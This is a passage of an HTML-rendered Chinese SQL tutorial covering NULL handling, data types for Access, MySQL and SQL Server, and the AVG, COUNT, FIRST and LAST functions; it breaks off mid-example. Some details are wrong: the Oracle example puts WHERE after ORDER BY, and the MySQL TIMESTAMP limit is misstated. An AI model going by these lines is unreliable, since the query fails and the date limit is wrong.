<h3 id="SQL-NULL-值"><a href="#SQL-NULL-值" class="headerlink" title="SQL NULL 值"></a>SQL NULL 值</h3><p>NULL 值代表遗漏的未知数据。默认地，表的列可以存放 NULL 值。</p>
<ol>
<li><p><strong>SQL 的 NULL 值处理</strong></p>
<p>请看下面的 “Persons” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left"></td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left"></td>
<td align="left">Stavanger</td>
</tr>
</tbody></table>
<p>假如 “Persons” 表中的 “Address” 列是可选的。这意味着如果在 “Address” 列插入一条不带值的记录，”Address” 列会使用 NULL 值保存。</p>
<p>那么如何测试 NULL 值呢？</p>
<p>无法使用比较运算符来测试 NULL 值，比如 =、&lt; 或 &lt;&gt;。</p>
<p>必须使用 <strong>IS NULL</strong> 和<strong>IS NOT NULL</strong> 操作符。</p>
</li>
<li><p><strong>SQL IS NULL</strong></p>
<p>如何仅仅选取在 “Address” 列中带有 NULL 值的记录呢？</p>
<p>必须使用 IS NULL 操作符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT LastName,FirstName,Address FROM Persons</span><br><span class="line">WHERE Address IS NULL</span><br></pre></td></tr></table></figure>

<p>结果集如下所示：</p>
<table>
<thead>
<tr>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>提示：</strong>请始终使用 IS NULL 来查找 NULL 值。</p>
</li>
<li><p><strong>SQL IS NOT NULL</strong></p>
<p>如何仅仅选取在 “Address” 列中不带有 NULL 值的记录呢？</p>
<p>必须使用 IS NOT NULL 操作符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT LastName,FirstName,Address FROM Persons</span><br><span class="line">WHERE Address IS NOT NULL</span><br></pre></td></tr></table></figure>

<p>结果集如下所示：</p>
<table>
<thead>
<tr>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
</tr>
</tbody></table>
</li>
</ol>
<h3 id="SQL-NULL-函数"><a href="#SQL-NULL-函数" class="headerlink" title="SQL NULL 函数"></a>SQL NULL 函数</h3><ol>
<li><p><strong>SQL ISNULL()、NVL()、IFNULL() 和 COALESCE() 函数</strong></p>
<p>请看下面的 “Products” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">ProductName</th>
<th align="left">UnitPrice</th>
<th align="left">UnitsInStock</th>
<th align="left">UnitsOnOrder</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Jarlsberg</td>
<td align="left">10.45</td>
<td align="left">16</td>
<td align="left">15</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Mascarpone</td>
<td align="left">32.56</td>
<td align="left">23</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Gorgonzola</td>
<td align="left">15.67</td>
<td align="left">9</td>
<td align="left">20</td>
</tr>
</tbody></table>
<p>假如 “UnitsOnOrder” 是可选的，而且可以包含 NULL 值。</p>
<p>使用下面的 SELECT 语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ProductName,UnitPrice*(UnitsInStock+UnitsOnOrder)</span><br><span class="line">FROM Products</span><br></pre></td></tr></table></figure>

<p>在上面的实例中，如果有 “UnitsOnOrder” 值是 NULL，那么结果是 NULL。</p>
<p>微软的 ISNULL() 函数用于规定如何处理 NULL 值。</p>
<p>NVL()、IFNULL() 和 COALESCE() 函数也可以达到相同的结果。</p>
<p>在这里，希望 NULL 值为 0。</p>
<p>下面，如果 “UnitsOnOrder” 是 NULL，则不会影响计算，因为如果值是 NULL 则 ISNULL() 返回 0：</p>
<ol>
<li><p><strong>SQL Server / MS Access</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ProductName,UnitPrice*(UnitsInStock+ISNULL(UnitsOnOrder,0))</span><br><span class="line">FROM Products</span><br></pre></td></tr></table></figure></li>
<li><p><strong>Oracle</strong></p>
<p>Oracle 没有 ISNULL() 函数。不过，可以使用 NVL() 函数达到相同的结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ProductName,UnitPrice*(UnitsInStock+NVL(UnitsOnOrder,0))</span><br><span class="line">FROM Products</span><br></pre></td></tr></table></figure></li>
<li><p><strong>MySQL</strong></p>
<p>MySQL 也拥有类似 ISNULL() 的函数。不过它的工作方式与微软的 ISNULL() 函数有点不同。</p>
<p>在 MySQL 中，可以使用 IFNULL() 函数，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ProductName,UnitPrice*(UnitsInStock+IFNULL(UnitsOnOrder,0))</span><br><span class="line">FROM Products</span><br></pre></td></tr></table></figure>

<p>或者可以使用 COALESCE() 函数，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ProductName,UnitPrice*(UnitsInStock+COALESCE(UnitsOnOrder,0))</span><br><span class="line">FROM Products</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h3 id="SQL-通用数据类型"><a href="#SQL-通用数据类型" class="headerlink" title="SQL 通用数据类型"></a>SQL 通用数据类型</h3><p>数据类型定义列中存放的值的种类。</p>
<ol>
<li><p><strong>SQL 通用数据类型</strong></p>
<p>数据库表中的每个列都要求有名称和数据类型。</p>
<p>SQL 开发人员必须在创建 SQL 表时决定表中的每个列将要存储的数据的类型。数据类型是一个标签，是便于 SQL 了解每个列期望存储什么类型的数据的指南，它也标识了 SQL 如何与存储的数据进行交互。</p>
<p>下面的表格列出了 SQL 中通用的数据类型：</p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CHARACTER(n)</td>
<td align="left">字符/字符串。固定长度 n。</td>
</tr>
<tr>
<td align="left">VARCHAR(n) 或 CHARACTER VARYING(n)</td>
<td align="left">字符/字符串。可变长度。最大长度 n。</td>
</tr>
<tr>
<td align="left">BINARY(n)</td>
<td align="left">二进制串。固定长度 n。</td>
</tr>
<tr>
<td align="left">BOOLEAN</td>
<td align="left">存储 TRUE 或 FALSE 值</td>
</tr>
<tr>
<td align="left">VARBINARY(n) 或 BINARY VARYING(n)</td>
<td align="left">二进制串。可变长度。最大长度 n。</td>
</tr>
<tr>
<td align="left">INTEGER(p)</td>
<td align="left">整数值（没有小数点）。精度 p。</td>
</tr>
<tr>
<td align="left">SMALLINT</td>
<td align="left">整数值（没有小数点）。精度 5。</td>
</tr>
<tr>
<td align="left">INTEGER</td>
<td align="left">整数值（没有小数点）。精度 10。</td>
</tr>
<tr>
<td align="left">BIGINT</td>
<td align="left">整数值（没有小数点）。精度 19。</td>
</tr>
<tr>
<td align="left">DECIMAL(p,s)</td>
<td align="left">精确数值，精度 p，小数点后位数 s。例如：decimal(5,2) 是一个小数点前有 3 位数，小数点后有 2 位数的数字。</td>
</tr>
<tr>
<td align="left">NUMERIC(p,s)</td>
<td align="left">精确数值，精度 p，小数点后位数 s。（与 DECIMAL 相同）</td>
</tr>
<tr>
<td align="left">FLOAT(p)</td>
<td align="left">近似数值，尾数精度 p。一个采用以 10 为基数的指数计数法的浮点数。该类型的 size 参数由一个指定最小精度的单一数字组成。</td>
</tr>
<tr>
<td align="left">REAL</td>
<td align="left">近似数值，尾数精度 7。</td>
</tr>
<tr>
<td align="left">FLOAT</td>
<td align="left">近似数值，尾数精度 16。</td>
</tr>
<tr>
<td align="left">DOUBLE PRECISION</td>
<td align="left">近似数值，尾数精度 16。</td>
</tr>
<tr>
<td align="left">DATE</td>
<td align="left">存储年、月、日的值。</td>
</tr>
<tr>
<td align="left">TIME</td>
<td align="left">存储小时、分、秒的值。</td>
</tr>
<tr>
<td align="left">TIMESTAMP</td>
<td align="left">存储年、月、日、小时、分、秒的值。</td>
</tr>
<tr>
<td align="left">INTERVAL</td>
<td align="left">由一些整数字段组成，代表一段时间，取决于区间的类型。</td>
</tr>
<tr>
<td align="left">ARRAY</td>
<td align="left">元素的固定长度的有序集合</td>
</tr>
<tr>
<td align="left">MULTISET</td>
<td align="left">元素的可变长度的无序集合</td>
</tr>
<tr>
<td align="left">XML</td>
<td align="left">存储 XML 数据</td>
</tr>
</tbody></table>
</li>
<li><p><strong>SQL 数据类型快速参考手册</strong></p>
<p>不同的数据库对数据类型定义提供不同的选择。</p>
<p>下面的表格显示了各种不同的数据库平台上一些数据类型的通用名称：</p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">Access</th>
<th align="left">SQLServer</th>
<th align="left">Oracle</th>
<th align="left">MySQL</th>
<th align="left">PostgreSQL</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>boolean</em></td>
<td align="left">Yes/No</td>
<td align="left">Bit</td>
<td align="left">Byte</td>
<td align="left">N/A</td>
<td align="left">Boolean</td>
</tr>
<tr>
<td align="left"><em>integer</em></td>
<td align="left">Number (integer)</td>
<td align="left">Int</td>
<td align="left">Number</td>
<td align="left">Int Integer</td>
<td align="left">Int Integer</td>
</tr>
<tr>
<td align="left"><em>float</em></td>
<td align="left">Number (single)</td>
<td align="left">Float Real</td>
<td align="left">Number</td>
<td align="left">Float</td>
<td align="left">Numeric</td>
</tr>
<tr>
<td align="left"><em>currency</em></td>
<td align="left">Currency</td>
<td align="left">Money</td>
<td align="left">N/A</td>
<td align="left">N/A</td>
<td align="left">Money</td>
</tr>
<tr>
<td align="left"><em>string (fixed)</em></td>
<td align="left">N/A</td>
<td align="left">Char</td>
<td align="left">Char</td>
<td align="left">Char</td>
<td align="left">Char</td>
</tr>
<tr>
<td align="left"><em>string (variable)</em></td>
<td align="left">Text (&lt;256) Memo (65k+)</td>
<td align="left">Varchar</td>
<td align="left">Varchar Varchar2</td>
<td align="left">Varchar</td>
<td align="left">Varchar</td>
</tr>
<tr>
<td align="left"><em>binary object</em></td>
<td align="left">OLE Object Memo</td>
<td align="left">Binary (fixed up to 8K) Varbinary (&lt;8K) Image (&lt;2GB)</td>
<td align="left">Long Raw</td>
<td align="left">Blob Text</td>
<td align="left">Binary Varbinary</td>
</tr>
</tbody></table>
</li>
</ol>
<h3 id="SQL-DB数据类型"><a href="#SQL-DB数据类型" class="headerlink" title="SQL DB数据类型"></a>SQL DB数据类型</h3><p>Microsoft Access、MySQL 和 SQL Server 所使用的数据类型和范围。</p>
<ol>
<li><p><strong>Microsoft Access 数据类型</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Text</td>
<td align="left">用于文本或文本与数字的组合。最多 255 个字符。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Memo</td>
<td align="left">Memo 用于更大数量的文本。最多存储 65,536 个字符。<strong>注释：</strong>无法对 memo 字段进行排序。不过它们是可搜索的。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Byte</td>
<td align="left">允许 0 到 255 的数字。</td>
<td align="left">1 字节</td>
</tr>
<tr>
<td align="left">Integer</td>
<td align="left">允许介于 -32,768 与 32,767 之间的全部数字。</td>
<td align="left">2 字节</td>
</tr>
<tr>
<td align="left">Long</td>
<td align="left">允许介于 -2,147,483,648 与 2,147,483,647 之间的全部数字。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">Single</td>
<td align="left">单精度浮点。处理大多数小数。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">Double</td>
<td align="left">双精度浮点。处理大多数小数。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">Currency</td>
<td align="left">用于货币。支持 15 位的元，外加 4 位小数。<strong>提示：</strong>可以选择使用哪个国家的货币。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">AutoNumber</td>
<td align="left">AutoNumber 字段自动为每条记录分配数字，通常从 1 开始。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">Date/Time</td>
<td align="left">用于日期和时间</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">Yes/No</td>
<td align="left">逻辑字段，可以显示为 Yes/No、True/False 或 On/Off。在代码中，使用常量 True 和 False （等价于 1 和 0）。<strong>注释：</strong>Yes/No 字段中不允许 Null 值</td>
<td align="left">1 比特</td>
</tr>
<tr>
<td align="left">Ole Object</td>
<td align="left">可以存储图片、音频、视频或其他 BLOBs（Binary Large OBjects）。</td>
<td align="left">最多 1GB</td>
</tr>
<tr>
<td align="left">Hyperlink</td>
<td align="left">包含指向其他文件的链接，包括网页。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Lookup Wizard</td>
<td align="left">允许创建一个可从下拉列表中进行选择的选项列表。</td>
<td align="left">4 字节</td>
</tr>
</tbody></table>
</li>
<li><p><strong>MySQL 数据类型</strong></p>
<p>在 MySQL 中，有三种主要的类型：Text（文本）、Number（数字）和 Date/Time（日期/时间）类型。</p>
<ol>
<li><p><strong>Text 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CHAR(size)</td>
<td align="left">保存固定长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的长度。最多 255 个字符。</td>
</tr>
<tr>
<td align="left">VARCHAR(size)</td>
<td align="left">保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符。<strong>注释：</strong>如果值的长度大于 255，则被转换为 TEXT 类型。</td>
</tr>
<tr>
<td align="left">TINYTEXT</td>
<td align="left">存放最大长度为 255 个字符的字符串。</td>
</tr>
<tr>
<td align="left">TEXT</td>
<td align="left">存放最大长度为 65,535 个字符的字符串。</td>
</tr>
<tr>
<td align="left">BLOB</td>
<td align="left">用于 BLOBs（Binary Large OBjects）。存放最多 65,535 字节的数据。</td>
</tr>
<tr>
<td align="left">MEDIUMTEXT</td>
<td align="left">存放最大长度为 16,777,215 个字符的字符串。</td>
</tr>
<tr>
<td align="left">MEDIUMBLOB</td>
<td align="left">用于 BLOBs（Binary Large OBjects）。存放最多 16,777,215 字节的数据。</td>
</tr>
<tr>
<td align="left">LONGTEXT</td>
<td align="left">存放最大长度为 4,294,967,295 个字符的字符串。</td>
</tr>
<tr>
<td align="left">LONGBLOB</td>
<td align="left">用于 BLOBs (Binary Large OBjects)。存放最多 4,294,967,295 字节的数据。</td>
</tr>
<tr>
<td align="left">ENUM(x,y,z,etc.)</td>
<td align="left">允许输入可能值的列表。可以在 ENUM 列表中列出最大 65535 个值。如果列表中不存在插入的值，则插入空值。<strong>注释：</strong>这些值是按照输入的顺序排序的。可以按照此格式输入可能的值： ENUM(‘X’,’Y’,’Z’)</td>
</tr>
<tr>
<td align="left">SET</td>
<td align="left">与 ENUM 类似，不同的是，SET 最多只能包含 64 个列表项且 SET 可存储一个以上的选择。</td>
</tr>
</tbody></table>
</li>
<li><p><strong>Number 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">TINYINT(size)</td>
<td align="left">带符号-128到127 ，无符号0到255。</td>
</tr>
<tr>
<td align="left">SMALLINT(size)</td>
<td align="left">带符号范围-32768到32767，无符号0到65535, size 默认为 6。</td>
</tr>
<tr>
<td align="left">MEDIUMINT(size)</td>
<td align="left">带符号范围-8388608到8388607，无符号的范围是0到16777215。 size 默认为9</td>
</tr>
<tr>
<td align="left">INT(size)</td>
<td align="left">带符号范围-2147483648到2147483647，无符号的范围是0到4294967295。 size 默认为 11</td>
</tr>
<tr>
<td align="left">BIGINT(size)</td>
<td align="left">带符号的范围是-9223372036854775808到9223372036854775807，无符号的范围是0到18446744073709551615。size 默认为 20</td>
</tr>
<tr>
<td align="left">FLOAT(size,d)</td>
<td align="left">带有浮动小数点的小数字。在 size 参数中规定显示最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
<tr>
<td align="left">DOUBLE(size,d)</td>
<td align="left">带有浮动小数点的大数字。在 size 参数中规显示定最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
<tr>
<td align="left">DECIMAL(size,d)</td>
<td align="left">作为字符串存储的 DOUBLE 类型，允许固定的小数点。在 size 参数中规定显示最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
</tbody></table>
<p><strong>注意：</strong>以上的 size 代表的并不是存储在数据库中的具体的长度，如 int(4) 并不是只能存储4个长度的数字。</p>
<p>实际上int(size)所占多少存储空间并无任何关系。int(3)、int(4)、int(8) 在磁盘上都是占用 4 btyes 的存储空间。就是在显示给用户的方式有点不同外，int(M) 跟 int 数据类型是相同的。</p>
<p>例如：int的值为10 （指定zerofill）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int（9）显示结果为000000010</span><br><span class="line">int（3）显示结果为010</span><br></pre></td></tr></table></figure>

<p>就是显示的长度不一样而已 都是占用四个字节的空间</p>
</li>
<li><p><strong>Date 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">DATE()</td>
<td align="left">日期。格式：YYYY-MM-DD<strong>注释：</strong>支持的范围是从 ‘1000-01-01’ 到 ‘9999-12-31’</td>
</tr>
<tr>
<td align="left">DATETIME()</td>
<td align="left">*日期和时间的组合。格式：YYYY-MM-DD HH:MM:SS<strong>注释：</strong>支持的范围是从 ‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td>
</tr>
<tr>
<td align="left">TIMESTAMP()</td>
<td align="left">*时间戳。TIMESTAMP 值使用 Unix 纪元(‘1970-01-01 00:00:00’ UTC) 至今的秒数来存储。格式：YYYY-MM-DD HH:MM:SS<strong>注释：</strong>支持的范围是从 ‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-09 03:14:07’ UTC</td>
</tr>
<tr>
<td align="left">TIME()</td>
<td align="left">时间。格式：HH:MM:SS<strong>注释：</strong>支持的范围是从 ‘-838:59:59’ 到 ‘838:59:59’</td>
</tr>
<tr>
<td align="left">YEAR()</td>
<td align="left">2 位或 4 位格式的年。<strong>注释：</strong>4 位格式所允许的值：1901 到 2155。2 位格式所允许的值：70 到 69，表示从 1970 到 2069。</td>
</tr>
</tbody></table>
<p>即便 DATETIME 和 TIMESTAMP 返回相同的格式，它们的工作方式很不同。在 INSERT 或 UPDATE 查询中，TIMESTAMP 自动把自身设置为当前的日期和时间。TIMESTAMP 也接受不同的格式，比如 YYYYMMDDHHMMSS、YYMMDDHHMMSS、YYYYMMDD 或 YYMMDD。</p>
</li>
</ol>
</li>
<li><p><strong>SQL Server 数据类型</strong></p>
<ol>
<li><p><strong>String 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">数据类型</td>
<td align="left">描述</td>
<td align="left">存储</td>
</tr>
<tr>
<td align="left">char(n)</td>
<td align="left">固定长度的字符串。最多 8,000 个字符。</td>
<td align="left">Defined width</td>
</tr>
<tr>
<td align="left">varchar(n)</td>
<td align="left">可变长度的字符串。最多 8,000 个字符。</td>
<td align="left">2 bytes + number of chars</td>
</tr>
<tr>
<td align="left">varchar(max)</td>
<td align="left">可变长度的字符串。最多 1,073,741,824 个字符。</td>
<td align="left">2 bytes + number of chars</td>
</tr>
<tr>
<td align="left">text</td>
<td align="left">可变长度的字符串。最多 2GB 文本数据。</td>
<td align="left">4 bytes + number of chars</td>
</tr>
<tr>
<td align="left">nchar</td>
<td align="left">固定长度的 Unicode 字符串。最多 4,000 个字符。</td>
<td align="left">Defined width x 2</td>
</tr>
<tr>
<td align="left">nvarchar</td>
<td align="left">可变长度的 Unicode 字符串。最多 4,000 个字符。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">nvarchar(max)</td>
<td align="left">可变长度的 Unicode 字符串。最多 536,870,912 个字符。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">ntext</td>
<td align="left">可变长度的 Unicode 字符串。最多 2GB 文本数据。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">bit</td>
<td align="left">允许 0、1 或 NULL</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">binary(n)</td>
<td align="left">固定长度的二进制字符串。最多 8,000 字节。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">varbinary</td>
<td align="left">可变长度的二进制字符串。最多 8,000 字节。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">varbinary(max)</td>
<td align="left">可变长度的二进制字符串。最多 2GB。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">image</td>
<td align="left">可变长度的二进制字符串。最多 2GB。</td>
<td align="left"></td>
</tr>
</tbody></table>
</li>
<li><p><strong>Number 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">tinyint</td>
<td align="left">允许从 0 到 255 的所有数字。</td>
<td align="left">1 字节</td>
</tr>
<tr>
<td align="left">smallint</td>
<td align="left">允许介于 -32,768 与 32,767 的所有数字。</td>
<td align="left">2 字节</td>
</tr>
<tr>
<td align="left">int</td>
<td align="left">允许介于 -2,147,483,648 与 2,147,483,647 的所有数字。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">bigint</td>
<td align="left">允许介于 -9,223,372,036,854,775,808 与 9,223,372,036,854,775,807 之间的所有数字。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">decimal(p,s)</td>
<td align="left">固定精度和比例的数字。允许从 -10^38 +1 到 10^38 -1 之间的数字。p 参数指示可以存储的最大位数（小数点左侧和右侧）。p 必须是 1 到 38 之间的值。默认是 18。s 参数指示小数点右侧存储的最大位数。s 必须是 0 到 p 之间的值。默认是 0。</td>
<td align="left">5-17 字节</td>
</tr>
<tr>
<td align="left">numeric(p,s)</td>
<td align="left">固定精度和比例的数字。允许从 -10^38 +1 到 10^38 -1 之间的数字。p 参数指示可以存储的最大位数（小数点左侧和右侧）。p 必须是 1 到 38 之间的值。默认是 18。s 参数指示小数点右侧存储的最大位数。s 必须是 0 到 p 之间的值。默认是 0。</td>
<td align="left">5-17 字节</td>
</tr>
<tr>
<td align="left">smallmoney</td>
<td align="left">介于 -214,748.3648 与 214,748.3647 之间的货币数据。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">money</td>
<td align="left">介于 -922,337,203,685,477.5808 与 922,337,203,685,477.5807 之间的货币数据。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">float(n)</td>
<td align="left">从 -1.79E + 308 到 1.79E + 308 的浮动精度数字数据。n 参数指示该字段保存 4 字节还是 8 字节。float(24) 保存 4 字节，而 float(53) 保存 8 字节。n 的默认值是 53。</td>
<td align="left">4 或 8 字节</td>
</tr>
<tr>
<td align="left">real</td>
<td align="left">从 -3.40E + 38 到 3.40E + 38 的浮动精度数字数据。</td>
<td align="left">4 字节</td>
</tr>
</tbody></table>
</li>
<li><p><strong>Date 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">datetime</td>
<td align="left">从 1753 年 1 月 1 日 到 9999 年 12 月 31 日，精度为 3.33 毫秒。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">datetime2</td>
<td align="left">从 1753 年 1 月 1 日 到 9999 年 12 月 31 日，精度为 100 纳秒。</td>
<td align="left">6-8 字节</td>
</tr>
<tr>
<td align="left">smalldatetime</td>
<td align="left">从 1900 年 1 月 1 日 到 2079 年 6 月 6 日，精度为 1 分钟。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">date</td>
<td align="left">仅存储日期。从 0001 年 1 月 1 日 到 9999 年 12 月 31 日。</td>
<td align="left">3 bytes</td>
</tr>
<tr>
<td align="left">time</td>
<td align="left">仅存储时间。精度为 100 纳秒。</td>
<td align="left">3-5 字节</td>
</tr>
<tr>
<td align="left">datetimeoffset</td>
<td align="left">与 datetime2 相同，外加时区偏移。</td>
<td align="left">8-10 字节</td>
</tr>
<tr>
<td align="left">timestamp</td>
<td align="left">存储唯一的数字，每当创建或修改某行时，该数字会更新。timestamp 值基于内部时钟，不对应真实时间。每个表只能有一个 timestamp 变量。</td>
<td align="left"></td>
</tr>
</tbody></table>
</li>
<li><p><strong>其他数据类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">sql_variant</td>
<td align="left">存储最多 8,000 字节不同数据类型的数据，除了 text、ntext 以及 timestamp。</td>
</tr>
<tr>
<td align="left">uniqueidentifier</td>
<td align="left">存储全局唯一标识符 (GUID)。</td>
</tr>
<tr>
<td align="left">xml</td>
<td align="left">存储 XML 格式化数据。最多 2GB。</td>
</tr>
<tr>
<td align="left">cursor</td>
<td align="left">存储对用于数据库操作的指针的引用。</td>
</tr>
<tr>
<td align="left">table</td>
<td align="left">存储结果集，供稍后处理。</td>
</tr>
</tbody></table>
</li>
</ol>
</li>
</ol>
<h2 id="SQL函数"><a href="#SQL函数" class="headerlink" title="SQL函数"></a>SQL函数</h2><p>用于计数和计算</p>
<h3 id="AVG-函数"><a href="#AVG-函数" class="headerlink" title="AVG() 函数"></a>AVG() 函数</h3><p>返回数值列的平均值。</p>
<p>SQL AVG() 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT AVG(column_name) FROM table_name</span><br></pre></td></tr></table></figure>

<h3 id="COUNT-函数"><a href="#COUNT-函数" class="headerlink" title="COUNT() 函数"></a>COUNT() 函数</h3><p>返回匹配指定条件的行数。</p>
<ol>
<li><p><strong>SQL COUNT(column_name) 语法</strong></p>
<p>COUNT(column_name) 函数返回指定列的值的数目（NULL 不计入）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT COUNT(column_name) FROM table_name;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>SQL COUNT(*) 语法</strong></p>
<p>COUNT(*) 函数返回表中的记录数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT COUNT(*) FROM table_name;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>SQL COUNT(DISTINCT column_name) 语法</strong></p>
<p>COUNT(DISTINCT column_name) 函数返回指定列的不同值的数目：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT COUNT(DISTINCT column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>COUNT(DISTINCT) 适用于 ORACLE 和 Microsoft SQL Server，但是无法用于 Microsoft Access。</p>
</li>
</ol>
<h3 id="FIRST-函数"><a href="#FIRST-函数" class="headerlink" title="FIRST() 函数"></a>FIRST() 函数</h3><p>返回指定的列中第一个记录的值。</p>
<p><strong>SQL FIRST() 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT FIRST(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>只有 MS Access 支持 FIRST() 函数。</p>
<ol>
<li><p><strong>SQL Server 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT TOP 1 *column_name* FROM *table_name</span><br><span class="line">*ORDER BY *column_name* ASC;</span><br><span class="line">SELECT TOP 1 name FROM Websites</span><br><span class="line">ORDER BY id ASC;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>MySQL 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT *column_name* FROM *table_name*</span><br><span class="line">ORDER BY *column_name* ASC</span><br><span class="line">LIMIT 1;</span><br><span class="line">SELECT name FROM Websites</span><br><span class="line">ORDER BY id ASC</span><br><span class="line">LIMIT 1;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>Oracle 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT *column_name* FROM *table_name*</span><br><span class="line">ORDER BY *column_name* ASC</span><br><span class="line">WHERE ROWNUM &lt;=1;</span><br><span class="line">SELECT name FROM Websites</span><br><span class="line">ORDER BY id ASC</span><br><span class="line">WHERE ROWNUM &lt;=1;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="LAST-函数"><a href="#LAST-函数" class="headerlink" title="LAST() 函数"></a>LAST() 函数</h3><p>返回指定的列中最后一个记录的值。</p>
<p><strong>SQL LAST() 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT LAST(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>只有 MS Access 支持 LAST() 函数。</p>
<ol>
<li><p><strong>SQL Server 语法</strong></p>
